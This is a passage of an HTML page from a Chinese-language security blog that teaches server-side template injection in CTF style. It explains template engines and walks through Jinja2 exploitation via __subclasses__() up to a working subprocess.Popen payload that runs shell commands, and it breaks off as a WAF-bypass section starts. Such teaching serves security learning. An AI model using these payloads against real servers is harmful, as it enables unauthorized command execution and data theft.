@@ -1,0 +1,1230 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="温柔刀">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="温柔刀">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="">
+    <meta name="description" content="理论SSTI的总结 什么是 SSTI？为什么它是一个漏洞？什么是模板引擎？在网站开发中，模板引擎是一种用来生成网页内容的工具。它允许开发者写一个“模板”，模板里可以写一些固定内容，也可以写一些占位符（变量），这些占位符在运行时会被真实数据替换。 比如你有一个模板： 12345&lt;html&gt;  &lt;body&gt;    &lt;h1&gt;Hello, &#123;&#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI">
+<meta property="og:url" content="http://example.com/2025/07/21/SSTI/index.html">
+<meta property="og:site_name" content="三重门">
+<meta property="og:description" content="理论SSTI的总结 什么是 SSTI？为什么它是一个漏洞？什么是模板引擎？在网站开发中，模板引擎是一种用来生成网页内容的工具。它允许开发者写一个“模板”，模板里可以写一些固定内容，也可以写一些占位符（变量），这些占位符在运行时会被真实数据替换。 比如你有一个模板： 12345&lt;html&gt;  &lt;body&gt;    &lt;h1&gt;Hello, &#123;&#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1753085456873-c54e9251-b66c-411b-a36e-0f448d781de8.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1753085699337-48370e2d-230f-4f7c-9c31-0298626cb604.png">
+<meta property="article:published_time" content="2025-07-21T09:26:09.000Z">
+<meta property="article:modified_time" content="2025-07-22T15:27:53.519Z">
+<meta property="article:author" content="温柔刀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1753085456873-c54e9251-b66c-411b-a36e-0f448d781de8.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>SSTI · Gentle_knife&#39;s Studio</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Gentle_knife's Studio.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Gentle_knife&#39;s Studio.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">SSTI</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                SSTI
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+</div>
+
+                <!-- 文章字数统计 -->
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">6k</span>Reading time: <span class="post-count reading-time">28 min</span></span>
+                    </div>
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/07/21</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <meta name="referrer" content="no-referrer" />
+
+<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/aecous/nwresg/tl3gpk0rdz0qygdm">SSTI的总结</a></p>
+<h2 id="什么是-SSTI？为什么它是一个漏洞？"><a href="#什么是-SSTI？为什么它是一个漏洞？" class="headerlink" title="什么是 SSTI？为什么它是一个漏洞？"></a>什么是 SSTI？为什么它是一个漏洞？</h2><h3 id="什么是模板引擎？"><a href="#什么是模板引擎？" class="headerlink" title="什么是模板引擎？"></a>什么是模板引擎？</h3><p>在网站开发中，<strong>模板引擎</strong>是一种用来生成网页内容的工具。它允许开发者写一个“模板”，模板里可以写一些固定内容，也可以写一些占位符（变量），这些占位符在运行时会被真实数据替换。</p>
+<p>比如你有一个模板：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, &#123;&#123; username &#125;&#125;!&lt;/h1&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当你访问网页时，服务器会把<code>&#123;&#123; username &#125;&#125;</code>替换成具体的用户名，比如“小明”，然后给你展示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello, 小明!&lt;/h1&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>&#123;&#123; username &#125;&#125;</code>就是模板语法中的变量占位符。</p>
+<h3 id="SSTI-是什么？"><a href="#SSTI-是什么？" class="headerlink" title="SSTI 是什么？"></a>SSTI 是什么？</h3><p>SSTI 是 <strong>Server-Side Template Injection（服务端模板注入）</strong> 的缩写。它是一种安全漏洞。</p>
+<p>它发生的情况是：</p>
+<ul>
+<li>网站接受用户输入（比如用户名、评论、搜索词等）</li>
+<li>直接把用户输入放到模板里，且<strong>没有做任何过滤和限制</strong></li>
+<li>用户输入中可能包含恶意模板代码</li>
+<li>服务器在渲染模板时，会把这些恶意代码当成正常模板代码执行</li>
+</ul>
+<p>举个简单例子：</p>
+<p>假设模板是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, &#123;&#123; user_input &#125;&#125;!</span><br></pre></td></tr></table></figure>
+
+<p>如果正常用户输入<code>小明</code>，页面会显示<code>Hello, 小明!</code>。</p>
+<p>但如果攻击者输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 7 * 7 &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务器会把<code>&#123;&#123; 7 * 7 &#125;&#125;</code>当成模板语法执行，计算7乘7，显示<code>Hello, 49!</code></p>
+<p>这个例子很简单，但如果模板引擎功能更强大，攻击者就能执行更多危险操作，比如读取文件、执行命令等。</p>
+<h3 id="为什么-SSTI-很危险？"><a href="#为什么-SSTI-很危险？" class="headerlink" title="为什么 SSTI 很危险？"></a>为什么 SSTI 很危险？</h3><ul>
+<li><strong>服务器代码执行</strong>：攻击者可以执行任意代码，可能拿到服务器权限</li>
+<li><strong>数据泄露</strong>：能读取服务器上的敏感信息，比如配置文件、数据库密码</li>
+<li><strong>破坏系统</strong>：可能导致服务器崩溃，或者被用来做更高级的攻击</li>
+</ul>
+<h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><ul>
+<li>模板引擎：用变量和模板语法生成网页内容</li>
+<li>SSTI：用户输入没过滤，恶意模板代码被执行</li>
+<li>结果：攻击者能控制服务器执行代码，带来安全风险</li>
+</ul>
+<h2 id="常见模板引擎及其模板语法特点"><a href="#常见模板引擎及其模板语法特点" class="headerlink" title="常见模板引擎及其模板语法特点"></a>常见模板引擎及其模板语法特点</h2><h3 id="为什么要了解不同模板引擎？"><a href="#为什么要了解不同模板引擎？" class="headerlink" title="为什么要了解不同模板引擎？"></a>为什么要了解不同模板引擎？</h3><p>因为不同的语言和框架用的模板引擎不同，它们的语法也不完全一样。要判断一个网站是不是存在 SSTI，首先要<strong>识别用的是哪种模板引擎</strong>，然后才能构造合适的 payload（注入语句）。</p>
+<h3 id="常见的模板引擎分类（按语言划分）"><a href="#常见的模板引擎分类（按语言划分）" class="headerlink" title="常见的模板引擎分类（按语言划分）"></a>常见的模板引擎分类（按语言划分）</h3><table>
+<thead>
+<tr>
+<th>编程语言</th>
+<th>模板引擎</th>
+<th>特点示例（打印 7*7）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Python</td>
+<td><strong>Jinja2</strong></td>
+<td><code>&#123;&#123; 7*7 &#125;&#125;</code><br/> → 49</td>
+</tr>
+<tr>
+<td>PHP</td>
+<td>Twig</td>
+<td><code>&#123;&#123; 7*7 &#125;&#125;</code><br/> → 49</td>
+</tr>
+<tr>
+<td>Ruby</td>
+<td>ERB</td>
+<td><code>&lt;%= 7*7 %&gt;</code><br/> → 49</td>
+</tr>
+<tr>
+<td>Java</td>
+<td>Freemarker</td>
+<td><code>$&#123;7*7&#125;</code><br/> → 49</td>
+</tr>
+<tr>
+<td>Java</td>
+<td>Velocity</td>
+<td><code>#set($x = 7*7) $x</code><br/> → 49</td>
+</tr>
+<tr>
+<td>JavaScript</td>
+<td>EJS</td>
+<td><code>&lt;%= 7*7 %&gt;</code><br/> → 49</td>
+</tr>
+</tbody></table>
+<h3 id="你需要记住的重点（先掌握-Jinja2）"><a href="#你需要记住的重点（先掌握-Jinja2）" class="headerlink" title="你需要记住的重点（先掌握 Jinja2）"></a>你需要记住的重点（先掌握 Jinja2）</h3><p>我们最常见、最常练习的 SSTI 题目，一般都是基于 Python 的 <strong>Jinja2</strong> 模板引擎。</p>
+<p>它的语法特点是：</p>
+<ul>
+<li>变量：<code>&#123;&#123; variable &#125;&#125;</code></li>
+<li>表达式：<code>&#123;&#123; 1+2 &#125;&#125;</code></li>
+<li>函数调用：<code>&#123;&#123; func() &#125;&#125;</code></li>
+<li>控制结构：<code>&#123;% if ... %&#125;</code>、<code>&#123;% for ... %&#125;</code>（但用得较少）</li>
+</ul>
+<p>Jinja2 功能强大，漏洞利用空间大，所以我们重点学习它。</p>
+<h2 id="Jinja2-的基本利用方式和变量调试方法"><a href="#Jinja2-的基本利用方式和变量调试方法" class="headerlink" title="Jinja2 的基本利用方式和变量调试方法"></a>Jinja2 的基本利用方式和变量调试方法</h2><h3 id="判断是否存在-SSTI（测试表达式执行）"><a href="#判断是否存在-SSTI（测试表达式执行）" class="headerlink" title="判断是否存在 SSTI（测试表达式执行）"></a>判断是否存在 SSTI（测试表达式执行）</h3><p>如果你看到一个输入框、URL 参数、表单，内容被服务器处理后显示出来，你可以尝试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果页面显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49</span><br></pre></td></tr></table></figure>
+
+<p>说明服务器把你的内容<strong>当成了 Jinja2 模板表达式执行了</strong>。</p>
+<h3 id="探测变量（寻找“对象”）"><a href="#探测变量（寻找“对象”）" class="headerlink" title="探测变量（寻找“对象”）"></a>探测变量（寻找“对象”）</h3><p>Jinja2 是基于 Python 的模板引擎，它有很多内置的对象。即使你无法直接看到系统函数，也可以通过“找父类、找属性”慢慢探索出更多功能。</p>
+<h4 id="一个常见的调试技巧是："><a href="#一个常见的调试技巧是：" class="headerlink" title="一个常见的调试技巧是："></a>一个常见的调试技巧是：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__ &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它会返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>意思是：你构造了一个空字符串 <code>&#39;&#39;</code>，然后用 <code>. __class__</code> 找到了它的类，也就是 <code>str</code>。</p>
+<h3 id="到-mro-→-父类列表"><a href="#到-mro-→-父类列表" class="headerlink" title="到 __mro__ → 父类列表"></a>到 <code>__mro__</code> → 父类列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__ &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出会是一个元组（类的继承链）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>这里你已经能访问到 <code>object</code> 类了，它是所有类的父类。</p>
+<h3 id="找到所有子类（核心技巧）"><a href="#找到所有子类（核心技巧）" class="headerlink" title="找到所有子类（核心技巧）"></a>找到所有子类（核心技巧）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这行代码的意思是：</p>
+<ul>
+<li><code>&#39;&#39;.__class__</code> 是 <code>str</code></li>
+<li><code>.__mro__[1]</code> 是 <code>object</code></li>
+<li><code>.__subclasses__()</code> 是 <code>object</code> 的所有子类（列表）</li>
+</ul>
+<p>这个列表包含了所有 Python 中加载的类，比如：</p>
+<ul>
+<li><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></li>
+<li><code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></li>
+<li>…</li>
+</ul>
+<p>如果你能在这里找到 <code>subprocess.Popen</code>，你就有机会执行系统命令了！</p>
+<h2 id="如何在-Jinja2-中利用-subprocess-Popen-执行命令"><a href="#如何在-Jinja2-中利用-subprocess-Popen-执行命令" class="headerlink" title="如何在 Jinja2 中利用 subprocess.Popen 执行命令"></a>如何在 Jinja2 中利用 <code>subprocess.Popen</code> 执行命令</h2><h3 id="思路概览"><a href="#思路概览" class="headerlink" title="思路概览"></a>思路概览</h3><p>Jinja2 是基于 Python 的，所以我们目标就是：</p>
+<p>✅ 在模板中找到 Python 的某个“可以执行命令”的类，比如：<br>→ <code>subprocess.Popen</code><br>→ 或者 <code>os.system</code></p>
+<p>然后我们通过模板语法调用它们：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 命令执行类(&quot;ls&quot;, shell=True, stdout=-1).communicate()[0] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="怎么找到-subprocess-Popen？"><a href="#怎么找到-subprocess-Popen？" class="headerlink" title="怎么找到 subprocess.Popen？"></a>怎么找到 <code>subprocess.Popen</code>？</h3><p>我们上一部分说到了可以找到所有类的列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这会返回一个很长的列表，其中某一项就是 <code>&lt;class &#39;subprocess.Popen&#39;&gt;</code>。</p>
+<p>你可以像下面这样枚举看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[index] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你可以一个个试，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[408] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要输出类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &#x27;subprocess.Popen&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>你就找到它了！这时候记住这个下标，比如是408。</p>
+<h3 id="造-payload-执行命令"><a href="#造-payload-执行命令" class="headerlink" title="造 payload 执行命令"></a>造 payload 执行命令</h3><p>找到了 Popen 之后，我们就能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[408](&quot;ls&quot;, shell=True, stdout=-1).communicate()[0] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释一下：</p>
+<ul>
+<li><code>shell=True</code>：允许像终端那样执行命令</li>
+<li><code>stdout=-1</code>：表示捕获输出</li>
+<li><code>.communicate()[0]</code>：获取执行结果</li>
+</ul>
+<p>最终，这一段 payload 会在服务端执行 <code>ls</code> 命令，并把结果返回到网页上。</p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
+<li>如果不能使用 <code>shell=True</code>，可能只能执行二进制命令（麻烦点）</li>
+<li>某些环境中你找不到 <code>subprocess</code>，但可以找 <code>os.system</code>、<code>eval</code> 等其他方式（我们后面再讲）</li>
+<li>有时候输出是字节串（如：<code>b&#39;flag.txt\n&#39;</code>），可以加 <code>.decode()</code> 或 <code>.strip()</code> 优化显示</li>
+</ul>
+<h3 id="总结这一部分"><a href="#总结这一部分" class="headerlink" title="总结这一部分"></a>总结这一部分</h3><p>完整攻击流程如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jinja2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[408](&quot;ls&quot;, shell=True, stdout=-1).communicate()[0] &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就是<strong>Jinja2 SSTI 命令执行的典型 payload</strong>。</p>
+<h2 id="更方便地找-subclass-字符串构造技巧"><a href="#更方便地找-subclass-字符串构造技巧" class="headerlink" title="更方便地找 subclass + 字符串构造技巧"></a>更方便地找 subclass + 字符串构造技巧</h2><h3 id="无引号构造字符串技巧"><a href="#无引号构造字符串技巧" class="headerlink" title="无引号构造字符串技巧"></a>无引号构造字符串技巧</h3><p>有时候 WAF（防护系统）会限制你使用引号（<code>&quot;</code> 或 <code>&#39;</code>），比如你不能写：</p>
